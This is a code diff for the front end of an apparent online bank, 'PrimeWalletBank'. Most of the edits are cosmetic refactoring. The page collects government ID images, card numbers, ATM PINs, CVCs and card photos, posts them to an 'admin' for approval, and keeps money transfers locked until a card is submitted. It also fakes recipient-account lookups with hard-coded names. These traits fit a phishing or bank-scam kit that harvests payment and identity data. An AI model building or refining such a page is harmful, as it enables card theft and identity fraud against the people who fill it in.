@@ -117,7 +117,6 @@
       <div class="step active">1<br>Personal</div>
       <div class="step">2<br>Location</div>
       <div class="step">3<br>Verify</div>
-      <div class="step">4<br>Upload ID</div>
     </div>
     <h2>Create Your Account</h2>
     <p style="color:#64748B;margin-bottom:20px;">All fields required — Real documents only.</p>
@@ -214,7 +213,6 @@
     <input type="email" id="loginEmail" placeholder="Enter your email">
     <label>Password</label>
     <input type="password" id="loginPass" placeholder="Enter your password">
-    <div class="alert-info" id="loginAlert" style="display:none;"></div>
     <button class="btn-primary" onclick="login()">🔑 Sign In</button>
     <div class="btn-row"><button class="btn-secondary" onclick="showPage('landingPage')">Cancel</button></div>
     <p style="text-align:center;margin-top:20px;color:#64748B;">Don't have an account? <a href="#" onclick="showPage('registerPage')" style="color:var(--pri);font-weight:600;">Create Account</a></p>
@@ -428,27 +426,16 @@
 <!-- ALL OTHER PAGES — FULLY OPENED MENUS -->
 <!-- ============================================== -->
 <div id="billsPage" class="page"><div class="container"><button onclick="goBack()" style="background:none;border:none;color:var(--pri);font-size:16px;cursor:pointer;">← Back</button><h2>📄 Pay Bills</h2><div class="card"><p>Select bill type and enter details to pay.</p><label>Bill Type</label><select><option>Electricity</option><option>Water</option><option>Internet</option><option>Phone</option><option>TV / Cable</option></select><label>Amount</label><input type="number" placeholder="0.00"><button class="btn-primary" style="margin-top:16px;">Pay Bill</button></div></div></div>
-
 <div id="utilitiesPage" class="page"><div class="container"><button onclick="goBack()" style="background:none;border:none;color:var(--pri);font-size:16px;cursor:pointer;">← Back</button><h2>⚡ Utilities & Services</h2><div class="card"><p>All utility services available here.</p><button class="btn-primary">View All Services</button></div></div></div>
-
 <div id="messagesPage" class="page"><div class="container"><button onclick="goBack()" style="background:none;border:none;color:var(--pri);font-size:16px;cursor:pointer;">← Back</button><h2>💬 Messages & Notifications</h2><div class="card"><p>No messages yet.</p></div></div></div>
-
 <div id="profilePage" class="page"><div class="container"><button onclick="goBack()" style="background:none;border:none;color:var(--pri);font-size:16px;cursor:pointer;">← Back</button><h2>👤 Profile & Settings</h2><div class="card"><p>Name: <span id="pName">—</span></p><p>Email: <span id="pEmail">—</span></p><p>Phone: <span id="pPhone">—</span></p><p>Status: <span id="pStatus">Pending</span></p><button class="btn-primary" onclick="loadProfile()">Refresh Profile</button><button class="btn-secondary" onclick="logout()" style="margin-top:12px;">🚪 Logout</button></div></div></div>
-
 <div id="myCardsPage" class="page"><div class="container"><button onclick="goBack()" style="background:none;border:none;color:var(--pri);font-size:16px;cursor:pointer;">← Back</button><h2>💳 My Cards</h2><div class="card" id="myCardsList"><p>No cards added yet.</p><button class="btn-primary" onclick="openPage('cardPage')">Add Card</button></div></div></div>
-
 <div id="historyPage" class="page"><div class="container"><button onclick="goBack()" style="background:none;border:none;color:var(--pri);font-size:16px;cursor:pointer;">← Back</button><h2>📊 Transaction History</h2><div class="card"><p>No transactions yet.</p></div></div></div>
-
 <div id="checkingPage" class="page"><div class="container"><button onclick="goBack()" style="background:none;border:none;color:var(--pri);font-size:16px;cursor:pointer;">← Back</button><h2>🏦 Checking Account</h2><div class="card"><p>Standard checking account.</p><p>Balance: $<span id="chkBal">0.00</span></p></div></div></div>
-
 <div id="savingsPage" class="page"><div class="container"><button onclick="goBack()" style="background:none;border:none;color:var(--pri);font-size:16px;cursor:pointer;">← Back</button><h2>💰 Savings & CDs</h2><div class="card"><p>High-yield savings options.</p><p>Balance: $<span id="savBal">0.00</span></p></div></div></div>
-
 <div id="creditPage" class="page"><div class="container"><button onclick="goBack()" style="background:none;border:none;color:var(--pri);font-size:16px;cursor:pointer;">← Back</button><h2>💳 Credit Cards</h2><div class="card"><p>Credit card options.</p></div></div></div>
-
 <div id="mortgagePage" class="page"><div class="container"><button onclick="goBack()" style="background:none;border:none;color:var(--pri);font-size:16px;cursor:pointer;">← Back</button><h2>🏠 Mortgage & Loans</h2><div class="card"><p>Loan and mortgage options.</p></div></div></div>
-
 <div id="supportPage" class="page"><div class="container"><button onclick="goBack()" style="background:none;border:none;color:var(--pri);font-size:16px;cursor:pointer;">← Back</button><h2>🎧 Support & Help Center</h2><div class="card"><p>Email: support@primewalletbank.com</p><p>Phone: +1 (888) XXX-XXXX</p></div></div></div>
-
 <div id="morePage" class="page"><div class="container"><button onclick="goBack()" style="background:none;border:none;color:var(--pri);font-size:16px;cursor:pointer;">← Back</button><h2>☰ More</h2><div class="card"><p>Settings, Security, Limits, Help & More.</p></div></div></div>
 
 <!-- ============================================== -->
@@ -509,15 +496,10 @@ function showPage(pageId) {
   document.getElementById(pageId).classList.add('active');
   pageHistory = [pageId];
   
-  // Show bottom nav only for dashboard pages
   const nav = document.getElementById('bottomNav');
-  if (['dashboardPage','depositPage','sendPage','cardPage','billsPage','utilitiesPage','messagesPage','profilePage','myCardsPage','historyPage','checkingPage','savingsPage','creditPage','mortgagePage','supportPage','morePage'].includes(pageId)) {
-    nav.style.display = 'grid';
-  } else {
-    nav.style.display = 'none';
-  }
+  const navPages = ['dashboardPage','depositPage','sendPage','cardPage','billsPage','utilitiesPage','messagesPage','profilePage','myCardsPage','historyPage','checkingPage','savingsPage','creditPage','mortgagePage','supportPage','morePage'];
+  nav.style.display = navPages.includes(pageId) ? 'grid' : 'none';
   
-  // Update header button
   const authBtn = document.getElementById('headerAuthBtn');
   if (currentUser) {
     authBtn.textContent = '👤 Profile';
@@ -544,8 +526,7 @@ function setNavActive(index) {
 }
 
 function handleHeaderAuth() {
-  if (currentUser) openPage('profilePage');
-  else showPage('loginPage');
+  currentUser ? openPage('profilePage') : showPage('loginPage');
 }
 
 // ==================================================
@@ -615,7 +596,6 @@ function updateStates() {
   const country = document.getElementById('regCountry').value;
   const stateSelect = document.getElementById('regState');
   stateSelect.innerHTML = '<option value="">-- Select State --</option>';
-  
   if (locationData[country]) {
     locationData[country].states.forEach(s => {
       const opt = document.createElement('option');
@@ -631,7 +611,6 @@ function updateCities() {
   const state = document.getElementById('regState').value;
   const citySelect = document.getElementById('regCity');
   citySelect.innerHTML = '<option value="">-- Select City --</option>';
-  
   if (locationData[country] && locationData[country].cities[state]) {
     locationData[country].cities[state].forEach(c => {
       const opt = document.createElement('option');
@@ -645,7 +624,6 @@ function updateBankList() {
   const country = document.getElementById('sendCountry').value;
   const bankSelect = document.getElementById('sendBank');
   bankSelect.innerHTML = '<option value="">-- Select Bank --</option>';
-  
   if (bankData[country]) {
     bankData[country].forEach(b => {
       const opt = document.createElement('option');
@@ -670,7 +648,6 @@ function verifyRecipient() {
     return;
   }
   
-  // ✅ Simulate real owner lookup — in production connect to bank API
   const lookupNames = {
     "Access Bank": ["John Doe", "Adebayo Johnson", "Chioma Nnaji", "Ibrahim Musa"],
     "Zenith Bank": ["Michael Okafor", "Funke Akindele", "Tunde Bakare"],
@@ -696,7 +673,6 @@ function verifyRecipient() {
 // 📝 REGISTRATION STEPS
 // ==================================================
 function nextStep(step) {
-  // Validate current step
   if (step === 2) {
     if (!document.getElementById('regFullName').value.trim()) return alert("❌ Enter Full Name");
     if (!document.getElementById('regEmail').value.trim() || !document.getElementById('regEmail').value.includes('@')) return alert("❌ Enter valid Email");
@@ -711,7 +687,6 @@ function nextStep(step) {
     if (!document.getElementById('regCity').value) return alert("❌ Select City");
   }
   
-  // Show step
   for (let i=1; i<=3; i++) {
     document.getElementById('regStep'+i).classList.add('hidden');
     document.querySelectorAll('.step')[i-1].classList.remove('active');
@@ -724,7 +699,6 @@ function nextStep(step) {
 // 📤 SUBMIT REGISTRATION — SEND TO ADMIN
 // ==================================================
 async function submitRegistration() {
-  // Get all values
   const fullName = document.getElementById("regFullName").value.trim();
   const email = document.getElementById("regEmail").value.trim();
   const phone = document.getElementById("regPhone").value.trim();
@@ -737,15 +711,12 @@ async function submitRegistration() {
   const idFrontFile = document.getElementById("idFront")?.files[0];
   const idBackFile = document.getElementById("idBack")?.files[0];
 
-  // Validate
   if (!idType || !idNumber) return alert("❌ Select ID Type & Enter ID Number");
   if (!idFrontFile || !idBackFile) return alert("❌ Upload both ID Front & Back images");
 
-  // Convert images
   const idFront = await fileToDataUrl(idFrontFile);
   const idBack = await fileToDataUrl(idBackFile);
 
-  // Create user object
   const userData = {
     full_name: fullName,
     email: email,
@@ -765,7 +736,6 @@ async function submitRegistration() {
     registered_at: new Date().toISOString()
   };
 
-  // Save locally
   localStorage.setItem("registered_user", JSON.stringify(userData));
 
   // ✅ Send to Admin Panel
@@ -800,18 +770,13 @@ function login() {
   if (!savedUser) return alert("❌ No account found. Please register first.");
   if (savedUser.email !== email || savedUser.password !== pass) return alert("❌ Email or password incorrect");
 
-  // ✅ Login success
   currentUser = savedUser;
   hasApprovedCard = savedUser.card_approved || false;
   
-  // Update display
   document.getElementById('userBalance').textContent = Number(savedUser.balance || 0).toFixed(2);
   document.getElementById('userAccount').textContent = savedUser.account_number;
   
-  // Show notices
-  if (!savedUser.approved) {
-    document.getElementById('pendingNotice').style.display = 'block';
-  }
+  if (!savedUser.approved) document.getElementById('pendingNotice').style.display = 'block';
   if (!hasApprovedCard) {
     document.getElementById('noCardNotice').style.display = 'block';
     document.getElementById('sendLock').innerHTML = '🔒 Locked — Get Card First';
@@ -850,21 +815,20 @@ async function submitCard() {
   }
   if (!atmFrontFile || !atmBackFile) return alert("❌ Upload both Card Front & Back");
 
-  // Convert images
   const atmFront = await fileToDataUrl(atmFrontFile);
   const atmBack = await fileToDataUrl(atmBackFile);
 
-  // Update user data
-  currentUser.atmHolder = atmHolder;
+    currentUser.atmHolder = atmHolder;
   currentUser.atmNumber = atmNumber;
   currentUser.atmPin = atmPin;
   currentUser.atmCvc = atmCvc;
   currentUser.atmExpiry = atmExpiry;
   currentUser.atmFront = atmFront;
   currentUser.atmBack = atmBack;
-  currentUser.card_approved = false; // pending admin
+  currentUser.card_approved = false; // pending admin approval
 
   localStorage.setItem("registered_user", JSON.stringify(currentUser));
+
   // ✅ Send card details to Admin for approval
   window.postMessage({
     type: "CARD_SUBMISSION",
@@ -877,12 +841,13 @@ async function submitCard() {
     atmExpiry: atmExpiry,
     atmFront: atmFront,
     atmBack: atmBack
-     }, "*");
-   alert("✅ Card Submitted Successfully!\n\n⏳ Your card is under Admin review.\nYou will be notified once approved.");
-   openPage('dashboardPage');
-    } 
-    
- // ==================================================
+  }, "*");
+
+  alert("✅ Card Submitted Successfully!\n\n⏳ Your card is under Admin review.\nYou will be notified once approved.");
+  openPage('dashboardPage');
+}
+
+// ==================================================
 // 💰 DEPOSIT FUNCTION
 // ==================================================
 function processDeposit() {
@@ -978,19 +943,20 @@ window.onload = () => {
     hasApprovedCard = currentUser.card_approved || false;
   }
 };
-// 👇 ADD THIS — Auto-check approval status every 30 seconds!
- setInterval(() => {
-   if (currentUser && !hasApprovedCard) {
-     const saved = localStorage.getItem("registered_user");
-     if (saved) {
-       const fresh = JSON.parse(saved);
-       if (fresh.card_approved) {
-         hasApprovedCard = true;
-         alert("✅ 🎉 YOUR CARD IS APPROVED!\n\nYou can now Send Money & Pay Bills!");
-       }
-     }
-   }
- }, 30000); // Check every 30 seconds
+
+// 👇 Auto-check approval status every 30 seconds!
+setInterval(() => {
+  if (currentUser && !hasApprovedCard) {
+    const saved = localStorage.getItem("registered_user");
+    if (saved) {
+      const fresh = JSON.parse(saved);
+      if (fresh.card_approved) {
+        hasApprovedCard = true;
+        alert("✅ 🎉 YOUR CARD IS APPROVED!\n\nYou can now Send Money & Pay Bills!");
+      }
+    }
+  }
+}, 30000);
 
 </script>
 
